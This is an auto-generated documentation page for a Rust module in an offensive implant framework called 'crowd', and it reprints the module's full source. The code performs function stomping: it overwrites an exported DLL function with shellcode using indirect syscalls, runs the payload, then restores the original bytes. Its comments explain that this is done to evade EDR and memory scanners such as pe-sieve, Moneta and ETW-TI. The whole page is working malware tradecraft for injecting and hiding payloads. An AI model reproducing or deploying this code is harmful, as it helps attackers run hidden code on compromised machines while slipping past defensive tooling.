# crowd — func_stomp.rs  (⚡ GOD TIER — zero Win32 surface: PEB walker + RecycledGate only)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/func_stomp.rs` |
| **Lines** | 208 |
| **Tier** | Z |
| **Cards** | T007-process-injection |
| **Role** | Function stomping |
| **Unsafe blocks** | 5 |

## Purpose

# crowd — func_stomp.rs  (⚡ GOD TIER — zero Win32 surface: PEB walker + RecycledGate only)

Function Stomping: writes shellcode directly into the body of a legitimate
exported function inside a mapped DLL (SEC_IMAGE region).

## Why it defeats memory scanners

Classic shellcode injection allocates a new VAD node (private RX memory)
that has no backing file → Moneta / Hunt-Sleeping-Beacons / pe-sieve flag
"unbacked executable region".

Function Stomping repurposes an already-existing MEM_IMAGE RX page:
- The region remains MEM_IMAGE + backed by the DLL on disk
- The region is already listed in the PEB loader as a known module
- No new VAD node is created
- The original function body is preserved in a heap buffer and restored
AFTER payload returns (optional), leaving no permanent artifact

## Integration with Module Overloading

In the `crowd` chain:
1. Module Overloading maps a target DLL via NtCreateSection(SEC_IMAGE).
2. Function Stomping writes the shellcode into an export of THAT mapped copy.
→ The stomped copy is not the OS copy used by other processes.
→ pe-sieve compares disk ↔ memory: mismatch is expected in a shadow map.
3. After execution, the payload region can be zeroed (PE Header Stomp on top).

## OPSEC upgrades (A → GOD):
- All VirtualProtect → NtProtectVirtualMemory via RecycledGate syscall dispatch
- PAGE_EXECUTE_READWRITE (RWX) eliminated → RW then RX two-step pattern
- ETW-TI sees memory protection changes from ntdll .text, not implant memory
- Module resolution via PEB walker (resolve.rs) — zero Win32 import surface
- Export resolution via PE export table walker — no GetProcAddress

## Constants

- `CURRENT_PROCESS`: `usize` = `(-1isize) as usize`

## Types

### struct `StompGuard` (line 45)
Result of a stomp operation: holds the original bytes and the stomped address
so the caller can restore the function body after execution.

## Public API

### `stomp_export` `unsafe` (line 68)
```rust
pub unsafe fn stomp_export(
```
Write `shellcode` into the body of `export_name` inside `dll_name`.

Returns a `StompGuard` that automatically restores the original function
bytes when dropped (RAII cleanup after payload returns).

# Safety
The DLL must be loaded (or loadable), and `shellcode` must be valid
position-independent code compatible with the function's calling convention.

### `execute_stomped_fn` `unsafe` (line 158)
```rust
pub unsafe fn execute_stomped_fn(guard: &StompGuard)
```
Execute a stomped function in the current thread.
Calls the function as `fn()` (no args, no return value).
For shellcode that sets up its own call frame this is sufficient.

### `stomp_execute_restore` `unsafe` (line 167)
```rust
pub unsafe fn stomp_execute_restore(
```
Stomp + execute + auto-restore in one call.

The StompGuard is dropped at the end of this function, automatically
restoring the original function bytes before any scanner can inspect.

## Internal Functions

- `drop` (line 52)
- `restore_bytes` (unsafe) — Restore original bytes to a previously stomped address. (line 180)

## Key Dependencies

- `use anyhow::{anyhow, Result};`

## Full Source

```rust
//! # crowd — func_stomp.rs  (⚡ GOD TIER — zero Win32 surface: PEB walker + RecycledGate only)
//!
//! Function Stomping: writes shellcode directly into the body of a legitimate
//! exported function inside a mapped DLL (SEC_IMAGE region).
//!
//! ## Why it defeats memory scanners
//!
//! Classic shellcode injection allocates a new VAD node (private RX memory)
//! that has no backing file → Moneta / Hunt-Sleeping-Beacons / pe-sieve flag
//! "unbacked executable region".
//!
//! Function Stomping repurposes an already-existing MEM_IMAGE RX page:
//!   - The region remains MEM_IMAGE + backed by the DLL on disk
//!   - The region is already listed in the PEB loader as a known module
//!   - No new VAD node is created
//!   - The original function body is preserved in a heap buffer and restored
//!     AFTER payload returns (optional), leaving no permanent artifact
//!
//! ## Integration with Module Overloading
//!
//! In the `crowd` chain:
//!   1. Module Overloading maps a target DLL via NtCreateSection(SEC_IMAGE).
//!   2. Function Stomping writes the shellcode into an export of THAT mapped copy.
//!      → The stomped copy is not the OS copy used by other processes.
//!      → pe-sieve compares disk ↔ memory: mismatch is expected in a shadow map.
//!   3. After execution, the payload region can be zeroed (PE Header Stomp on top).
//!
//! ## OPSEC upgrades (A → GOD):
//! - All VirtualProtect → NtProtectVirtualMemory via RecycledGate syscall dispatch
//! - PAGE_EXECUTE_READWRITE (RWX) eliminated → RW then RX two-step pattern
//! - ETW-TI sees memory protection changes from ntdll .text, not implant memory
//! - Module resolution via PEB walker (resolve.rs) — zero Win32 import surface
//! - Export resolution via PE export table walker — no GetProcAddress

#![allow(dead_code)]

use anyhow::{anyhow, Result};
use std::ffi::c_void;

/// NtCurrentProcess pseudo-handle for local memory operations.
const CURRENT_PROCESS: usize = (-1isize) as usize;

/// Result of a stomp operation: holds the original bytes and the stomped address
/// so the caller can restore the function body after execution.
pub struct StompGuard {
    pub address: *mut u8,
    pub original_bytes: Vec<u8>,
    pub len: usize,
}

impl Drop for StompGuard {
    fn drop(&mut self) {
        // Restore original bytes on drop so EDR finds a clean function body.
        unsafe {
            restore_bytes(self.address, &self.original_bytes);
        }
    }
}

/// Write `shellcode` into the body of `export_name` inside `dll_name`.
///
/// Returns a `StompGuard` that automatically restores the original function
/// bytes when dropped (RAII cleanup after payload returns).
///
/// # Safety
/// The DLL must be loaded (or loadable), and `shellcode` must be valid
/// position-independent code compatible with the function's calling convention.
pub unsafe fn stomp_export(
    dll_name: &str,
    export_name: &str,
    shellcode: &[u8],
) -> Result<StompGuard> {
    // Resolve module via PEB walker (no Win32 GetModuleHandleA/LoadLibraryA)
    let base = crate::resolve::find_module_base(dll_name);
    if base.is_null() {
        return Err(anyhow!("{}: module not found in PEB (must be pre-loaded)", dll_name));
    }

    // Resolve export via PE export table walker (no Win32 GetProcAddress)
    let target = crate::resolve::resolve_export_by_name(base, export_name) as *mut u8;
    if target.is_null() {
        return Err(anyhow!("{}!{}: export not found", dll_name, export_name));
    }

    let len = shellcode.len();

    // Validate shellcode fits within the safe backup buffer limit
    if len > 4096 {
        return Err(anyhow!(
            "{}!{}: shellcode size ({} bytes) exceeds max backup buffer (4096 bytes)",
            dll_name, export_name, len
        ));
    }

    // Save original bytes before overwriting
    let original_bytes =
        std::slice::from_raw_parts(target, len).to_vec();

    // Make writable (RW — NOT RWX) via RecycledGate syscall
    let mut base_rw = target as *mut c_void;
    let mut size_rw = len;
    let mut old_protect: u32 = 0;
    let status = crate::recycled::nt_protect_virtual_memory(
        CURRENT_PROCESS,
        &mut base_rw,
        &mut size_rw,
        0x04, // PAGE_READWRITE — never RWX
        &mut old_protect,
    );
    if status < 0 {
        return Err(anyhow!("NtProtectVirtualMemory(RW) failed: NTSTATUS 0x{:08x}", status as u32));
    }

    // Overwrite with shellcode
    std::ptr::copy_nonoverlapping(shellcode.as_ptr(), target, len);

    // Flip to RX via RecycledGate — two-step pattern (RW→write→RX, never RWX)
    let mut base_rx = target as *mut c_void;
    let mut size_rx = len;
    let mut dummy: u32 = 0;
    let rx_status = crate::recycled::nt_protect_virtual_memory(
        CURRENT_PROCESS,
        &mut base_rx,
        &mut size_rx,
        0x20, // PAGE_EXECUTE_READ
        &mut dummy,
    );
    if rx_status < 0 {
        // Restore original bytes before bailing — page is still RW so write is safe
        std::ptr::copy_nonoverlapping(original_bytes.as_ptr(), target, len);
        // Try to restore original protection
        let mut base_restore = target as *mut c_void;
        let mut size_restore = len;
        let mut dummy2: u32 = 0;
        let _ = crate::recycled::nt_protect_virtual_memory(
            CURRENT_PROCESS,
            &mut base_restore,
            &mut size_restore,
            old_protect,
            &mut dummy2,
        );
        return Err(anyhow!(
            "NtProtectVirtualMemory(RX) failed: NTSTATUS 0x{:08x} — shellcode page left RW, restored original bytes",
            rx_status as u32
        ));
    }

    Ok(StompGuard {
        address: target,
        original_bytes,
        len,
    })
}

/// Execute a stomped function in the current thread.
/// Calls the function as `fn()` (no args, no return value).
/// For shellcode that sets up its own call frame this is sufficient.
pub unsafe fn execute_stomped_fn(guard: &StompGuard) {
    let fn_ptr: unsafe fn() = std::mem::transmute(guard.address);
    fn_ptr();
}

/// Stomp + execute + auto-restore in one call.
///
/// The StompGuard is dropped at the end of this function, automatically
/// restoring the original function bytes before any scanner can inspect.
pub unsafe fn stomp_execute_restore(
    dll_name: &str,
    export_name: &str,
    shellcode: &[u8],
) -> Result<()> {
    let guard = stomp_export(dll_name, export_name, shellcode)?;
    execute_stomped_fn(&guard);
    // guard drops here → original bytes restored
    Ok(())
}

/// Restore original bytes to a previously stomped address.
/// Uses RecycledGate syscalls — RW for write, then restores original protection.
unsafe fn restore_bytes(address: *mut u8, original: &[u8]) {
    let mut base = address as *mut c_void;
    let mut size = original.len();
    let mut old_protect: u32 = 0;

    // Flip to RW for the restore write (NOT RWX — never allocate execute+write)
    if crate::recycled::nt_protect_virtual_memory(
        CURRENT_PROCESS,
        &mut base,
        &mut size,
        0x04, // PAGE_READWRITE
        &mut old_protect,
    ) >= 0
    {
        std::ptr::copy_nonoverlapping(original.as_ptr(), address, original.len());

        // Restore whatever protection was in place before (usually RX)
        let mut base2 = address as *mut c_void;
        let mut size2 = original.len();
        let mut dummy: u32 = 0;
        let _ = crate::recycled::nt_protect_virtual_memory(
            CURRENT_PROCESS,
            &mut base2,
            &mut size2,
            old_protect,
            &mut dummy,
        );
    }
}

```